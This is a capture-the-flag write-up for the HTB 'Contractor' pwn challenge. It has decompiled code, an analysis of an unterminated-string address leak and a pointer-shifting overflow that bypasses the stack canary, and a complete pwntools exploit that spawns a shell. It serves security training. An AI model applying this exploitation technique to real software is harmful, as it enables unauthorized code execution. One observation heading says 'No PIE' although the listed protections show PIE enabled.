# HTB Cyber Apocalypse 2025 - Contractor Writeup
**Date:** March 21, 2025
**Author:** s1gn3rs

## Challenge Information

- **Category:** PWN
- **Challenge Name:** Contractor
- **Description:** Sir Alaric calls upon the bravest adventurers to join him in assembling the mightiest army in all of Eldoria. Together, you will safeguard the peace across the villages under his protection. Do you have the courage to answer the call?
- **Author:** w3th4nds

### Binary Security Features

```
Permissions:
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

### Key Observations

- **No PIE:** ASLR is on, so a leak is probably needed in order to get the real addresses.
- **Stack Canary:** We need to ensure we do not overwrite it incorrectly.
- **NX Enabled:** We cannot execute shellcode on the stack.
- **SHSTK & IBT Enabled:** These are mitigations for control-flow integrity, but we can bypass them with ROP.

---

## Binary Analysis
This challenge tries to aply a concept of secure buffer, where it copies each byte of the input one at each time to a designated location. We have a structure that looks like this:

```c
Struct info {
    char name[0x10];
    char reason[0x100];
    int64_t age;
    char specialty[0x10];
};
```
This structure is located on the stack, and at the beginning of the function, its contents are cleared using the following line: **memset(structInfo, 0, 0x128);**.

Take a look at the code and try to identify the issue related to how the input is read.

### Binary's Important Functions (Decompiled via Binary Ninja)

```c
int64_t contract()
{
    void* fsbase;
    int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
    execl("/bin/sh", "sh", 0);
    int64_t result = rax ^ *(uint64_t*)((char*)fsbase + 0x28);

    if (!result)
        return result;

    return __stack_chk_fail();
}



int64_t main()
{
    int64_t __saved_rbp_1;
    int64_t __saved_rbp = __saved_rbp_1;
    int32_t optionScanf;
    int32_t* i = &optionScanf;
    void* fsbase;
    int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
    int64_t rax_3 = COMBINE(0, 0x13f) / 0x10 * 0x10;

    while (i != &optionScanf - (rax_3 & 0xfffffffffffff000)) {...}

    void* rsp_1 = (char*)i - ((uint64_t)rax_3 & 0xfff);

    if ((uint64_t)rax_3 & 0xfff) {...}

    uint64_t structInfo = ((char*)rsp_1 + 0xf) >> 4 << 4;
    memset(structInfo, 0, 0x128);
    printf("%s[%sSir Alaric%s]: Young lad, I'm truly glad you want to join forces with me, but first I need you to tell me some things about you.. Please introduce yourself. What is your name?\n\n> ", stetic, stetic, stetic);

    i = 0;
    while (i <= 0xf)
    {
        read(0, &safe_buffer, 1);

        if (safe_buffer == b"\n")
            break;

        *(uint8_t*)(structInfo + (int64_t)i) = safe_buffer;
        i += 1;
    }

    printf("\n[%sSir Alaric%s]: Excellent! Now can you tell me the reason you want to join me?\n\n> ", stetic, stetic);

    i = 0;
    while (i <= 0xff)
    {
        read(0, &safe_buffer, 1);

        if (safe_buffer == b"\n")
            break;

        *(uint8_t*)(structInfo + (int64_t)i + 0x10) = safe_buffer;
        i += 1;
    }

    printf("\n[%sSir Alaric%s]: That's quite the reason why! And what is your age again?\n\n> ", stetic, stetic);
    __isoc99_scanf("%ld", structInfo + 0x110);
    int512_t zmm0;
    int512_t zmm1;
    int512_t zmm2;
    int512_t zmm3;
    int512_t zmm4;
    int512_t zmm5;
    int512_t zmm6;
    int512_t zmm7;
    zmm0 = printf("\n[%sSir Alaric%s]: You sound mature and experienced! One last thing, you have a certain specialty in combat?\n\n> ", stetic, stetic);

    i = 0;
    while (i <= 0xf)
    {
        zmm0 = read(0, &safe_buffer, 1);

        if (safe_buffer == b"\n")
            break;

        *(uint8_t*)(structInfo + (int64_t)i + 0x118) = safe_buffer;
        i += 1;
    }

    *(uint64_t*)(structInfo + 0x110);
    *(uint64_t*)((char*)rsp_1 - 0x10) = structInfo + 0x118;
    printf(/* nop */, /* nop */);
    int32_t amountChanges = 0;
    printf("[%sSir Alaric%s]: Please review and verify that your information is true and correct.\n", stetic, stetic);

    do
    {
        printf("\n1. Name      2. Reason\n3. Age       4. Specialty\n\n> ");
        __isoc99_scanf("%d", &optionScanf);
        int32_t option = optionScanf;

        if (option == 4)
        {
            printf("\n%s[%sSir Alaric%s]: And what are you good at: ",stetic, stetic, stetic);

            i = 0;
            while (i <= 0xff)
            {
                read(0, &safe_buffer, 1);

                if (safe_buffer == b"\n")
                    break;

                *(uint8_t*)(structInfo + (int64_t)i + 0x118) = safe_buffer;
                i += 1;
            }

            amountChanges += 1;
        }
        else if (option > 4)
        {
            printf("\n%s[%sSir Alaric%s]: Are you mocking me kid??\n\n", stetic, stetic, stetic);
            exit(0x520);  /* "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ…" */
        }
        else if (option == 3)
        {
            printf("\n%s[%sSir Alaric%s]: Did you say you are 120 years old? Please specify again: ", stetic, stetic, stetic);
            __isoc99_scanf("%d", structInfo + 0x110);
            amountChanges += 1;
        }
        else if (option > 3)
        {
            printf("\n%s[%sSir Alaric%s]: Are you mocking me kid??\n\n",stetic, stetic, stetic);
            exit(0x520);  /* "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ…" */
        }
        else if (option == 1)
        {
            printf("\n%s[%sSir Alaric%s]: Say your name again: ",stetic, stetic, stetic);

            i = 0;
            while (i <= 0xf)
            {
                read(0, &safe_buffer, 1);

                if (safe_buffer == b"\n")
                    break;

                *(uint8_t*)(structInfo + (int64_t)i) = safe_buffer;
                i += 1;
            }

            amountChanges += 1;
        }
        else if (option == 2)
        {
            printf("\n%s[%sSir Alaric%s]: Specify the reason again please: ",stetic, stetic, stetic);

            i = 0;
            while (i <= 0xff)
            {
                read(0, &safe_buffer, 1);

                if (safe_buffer == b"\n")
                    break;

                *(uint8_t*)(structInfo + (int64_t)i + 0x10) = safe_buffer;
                i += 1;
            }

            amountChanges += 1;
        }
        else
        {
            printf("\n%s[%sSir Alaric%s]: Are you mocking me kid??\n\n",stetic, stetic, stetic);
            exit(0x520);  /* "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ…" */
        }

        if (amountChanges == 1)
        {
            printf("\n%s[%sSir Alaric%s]: I suppose everything is correct now?\n\n> ",stetic, stetic, stetic);
            i = 0;
            void var_14;

            while (i <= 3)
            {
                read(0, &safe_buffer, 1);

                if (safe_buffer == 0xa)
                    break;

                *(uint8_t*)(&var_14 + (int64_t)i) = safe_buffer;
                i += 1;
            }

            if (!strncmp(&var_14, &data_2526, 3))
                break;
        }
    } while (amountChanges <= 1);

    printf("\n%s[%sSir Alaric%s]: We are ready to recruit you young lad!\n\n",stetic, stetic, stetic);

    if (rax == *(uint64_t*)((char*)fsbase + 0x28))
        return 0;

    return __stack_chk_fail();
}
```








### Important Findings
1. **Full fill `specialty`:**  
    Since `specialty` is the last 0x10 bytes of the struct, and we are able to send exactly 0x10 bytes to fill it, the last byte will be filled with our input byte instead of a null byte (`0x00`).

2. **Printing our info:**  
    After filling `specialty`, the binary prints back all the information we provided. Because `specialty` is not null-terminated, this gives us a leak of a code address (located on the stack). This allows us to retrieve the actual address of any part of the `.text` section of the binary. More explicitly, we now know the starting address of the `contract` function:   
   `25:0128│-028 0x7fffffffd748 —▸ 0x555555555b50 (__libc_csu_init) ◂— endbr64`


3. **Wrong length of `specialty`:**  
   When we try to modify the `specialty` field, the program copies up to 0x100 bytes from our input—even though `specialty` only has space for 0x10 bytes. This causes a **buffer overflow**.

4. **Final issue - buffer shift & stack canary bypass:**  
   When computing where to copy our input on the stack, the binary uses a variable to store the base address of the destination. In the middle of our buffer overflow, the least significant byte of this address gets overwritten. This shifts the destination of the buffer depending on what byte we wrote. Using this, we can **bypass the stack canary without overwriting it** and eventually overwrite the saved RIP with the address of the `contract` function.


## Quick Note about The Buffer Overflow and Running this Exploit
When trying to change the last byte of that variable, it may be necessary to run the exploit multiple times due to the randomness of the stack location. If you turned off Randomization in our machine turn it on when running the exploit.

---

## Exploit Code

```python
#!/usr/bin/env python3

from pwn import *

e = ELF("contractor_patched")
libc = ELF("glibc/libc.so.6")
ld = ELF("glibc/ld-linux-x86-64.so.2")

context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            # b* main+179
            b *main+797
            # b *main+1259
            # b *main+1328
            # b* main+927
            # b* main+893
            # b *main+1560
            b *main+1666
            # c
            define hook-stop
            x/10xg 0x7fffffffd798
            end
            """)
    elif cond == 3:
        r = remote("localhost", 12345)

    return r


def main():
    r = conn(1)

    r.sendlineafter(b"What is your name?\n", b"X"*0Xf)
    r.sendlineafter(b"o join me?\n", b"N"*0xff)
    r.sendlineafter(b"our age again?\n", b"1")
    r.sendafter(b"ty in combat?\n", b"C"*0x10)


    r.recvuntil(b"[Specialty]: CCCCCCCCCCCCCCCC")
    output = r.recvline()[:-1][::-1]
    leakAddress = int(output.hex(), 16)
    log.info(f"Leak Address: {hex(leakAddress)}")

    sContract = 0x0000555555555343
    sMain = 0x555555555441
    sLeak = 0x555555555b50
    sSafeBuffer = 0x55555555802c
    offsetSafeBuffer = sSafeBuffer - sLeak
    offsetMain = sMain - sLeak
    offsetSContract = sContract - sLeak

    addrContract = leakAddress + offsetSContract
    addrSafeBuffer = leakAddress + offsetSafeBuffer
    addrMain = leakAddress + offsetMain

    log.info(f"Safe Buffer: {hex(addrSafeBuffer)}")
    log.info(f"Main: {hex(addrMain)}")
    log.info(f"Contract: {hex(addrContract)}")


    r.sendlineafter(b" is true and correct", b"4")


    sRip = 0x7ffdd9559e78
    sBuffer = 0x7ffdd9559e38
    offsetRip =  sRip - sBuffer # no this will zero out an address in the middle of the stack that has our values
    # payload = b"\x00"* offsetRip + b"B"
    # 0x28 until the address that will be put inside of rdx is reached
    payload = b"\x00"* 0x20
    payload += b"\x98" # this will be guessi
    payload += b"\x11"* 0x7
    payload += p64(addrContract)
    r.sendlineafter(b"u good at:", payload)

    sleep(0.5)
    r.sendlineafter(b"correct now", b"Yes")
    r.sendline(b"ls /")
    output = r.recv()
    if output != b"":
        print(output.decode())
        r.sendline(b"ls /")

    output = r.recv()
    if output != b"":
        print(output.decode())
    r.interactive()

if __name__ == "__main__":
    main()
```
